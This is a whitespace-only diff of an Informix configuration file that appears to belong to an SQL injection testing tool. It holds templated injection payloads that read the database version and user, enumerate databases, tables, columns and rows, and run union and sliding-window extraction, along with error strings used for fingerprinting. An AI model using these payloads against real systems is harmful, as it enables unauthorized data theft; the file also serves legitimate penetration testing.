@@ -1,6 +1,6 @@
 vendor: Informix
 
-resource: 
+resource:
  info: |
   SELECT trim(
       DBINFO('version','full')
@@ -9,72 +9,72 @@ resource:
       || '${enclose_value_sql}'
       || USER
       || '${trail_sql}'
-  ) r 
+  ) r
   FROM TABLE(SET{1})
-  
- schema: 
+
+ schema:
   database: |
-   select 
+   select
        rr
        || '${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || trim(t.name)
            || '${separator_qte_sql}0${enclose_value_sql}'
            rr
-       from 
+       from
            (select distinct name from sysdatabases) t,
            (select distinct name from sysdatabases) t1
        where t.name >= t1.name
        group by 1
        ${limit}
    ) a
-   
+
   table: |
-   select 
+   select
        rr
-       ||'${trail_sql}' 
+       ||'${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || trim(t.tabname)
            || '${separator_qte_sql}0${enclose_value_sql}'
            rr
-       from 
+       from
            (select distinct tabname from ${database}:systables) t,
            (select distinct tabname from ${database}:systables) t1
        where t.tabname >= t1.tabname
        group by 1
        ${limit}
    ) a
-   
+
   column: |
-   select 
+   select
        rr
        || '${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || trim(t.colname)
            || '${separator_qte_sql}0${enclose_value_sql}'
            rr
-       from 
+       from
            (select distinct colname from ${database}:syscolumns c join ${database}:systables t on c.tabid = t.tabid where tabname = '${table}') t,
            (select distinct colname from ${database}:syscolumns c join ${database}:systables t on c.tabid = t.tabid where tabname = '${table}') t1
        where t.colname >= t1.colname
        group by 1
        ${limit}
    ) a
-   
-  row: 
+
+  row:
    query: |
-    select 
+    select
         rr
-        || '${trail_sql}' 
+        || '${trail_sql}'
         r
     from (
         select
@@ -89,12 +89,12 @@ resource:
         group by 1
         ${limit}
     ) a
-   fields: 
+   fields:
     field: trim(nvl(${field.value}, ''))
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
    select
        '${lead}'
@@ -102,31 +102,31 @@ strategy:
            r,
            ${window.char},
            32767
-       ) r 
+       ) r
    from (
        ${injection}
    ) x
   limit: having count(*) between ${limit.value} and ${limit.value}
   failsafe: |
-   select 
-       (1337${indice}7330%2b1) 
-       || '' r 
+   select
+       (1337${indice}7330%2b1)
+       || '' r
    FROM TABLE(SET{1})
   calibrator: |
    rpad(
-       '${calibrator_sql}', 
-       1024, 
+       '${calibrator_sql}',
+       1024,
        '${calibrator_sql}'
    )
   limitBoundary: 1
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - Found a quote for which there is no matching quote. [SQL State=
     - "[Informix][Informix ODBC Driver]General error. (SQLPrepare["
     - Informix database
-    
- normal: 
+
+ normal:
   indices: union select ${result_range} from (${indice_unique}) b
   capacity: "'${lead}${indice}' || ${calibrator}"
   orderBy: order by 1337
